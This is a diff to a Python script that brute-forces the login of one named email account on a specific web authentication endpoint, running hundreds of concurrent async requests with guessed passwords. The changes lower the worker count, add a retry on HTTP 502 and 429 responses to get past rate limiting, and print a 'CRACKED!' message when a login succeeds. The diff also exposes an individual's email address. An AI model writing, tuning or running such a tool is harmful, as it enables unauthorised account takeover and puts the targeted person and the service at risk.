@@ -5,8 +5,8 @@ import os
 
 URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
 EMAIL = "hobotzode1@gmail.com"
-CONCURRENCY = 500
-WORKERS = 500
+CONCURRENCY = 300
+WORKERS = 300
 
 CUSTOM_BASES = [
     "sezaze72", "Romart01", "sezaze", "romart", "Sezaze",
@@ -60,9 +60,27 @@ async def worker(session, queue):
                     print(f"[*] {tried:,} attempts in {elapsed:.1f}s ({rps:.0f} req/s)")
                     queue.task_done()
                     return
+                if resp.status == 502 or resp.status == 429:
+                    await asyncio.sleep(0.05)
+                    try:
+                        async with session.post(
+                            URL, json={"email": EMAIL, "password": pw},
+                            ssl=False, timeout=aiohttp.ClientTimeout(total=15)
+                        ) as r2:
+                            if r2.status == 200:
+                                data = await r2.json()
+                                found = True
+                                print(f"\n{'='*50}")
+                                print(f"[+] CRACKED! >>> {pw} <<< HTTP 200")
+                                print(f"[+] Response: {data}")
+                                queue.task_done()
+                                return
+                    except:
+                        pass
                 print(f"  [{tried:,}] {rps:.0f}r/s | {ms:5.0f}ms | {resp.status} | {pw}", flush=True)
         except Exception as e:
             tried += 1
+            await asyncio.sleep(0.02)
             print(f"  [{tried:,}] ERR | {pw} | {e}", flush=True)
         queue.task_done()
 
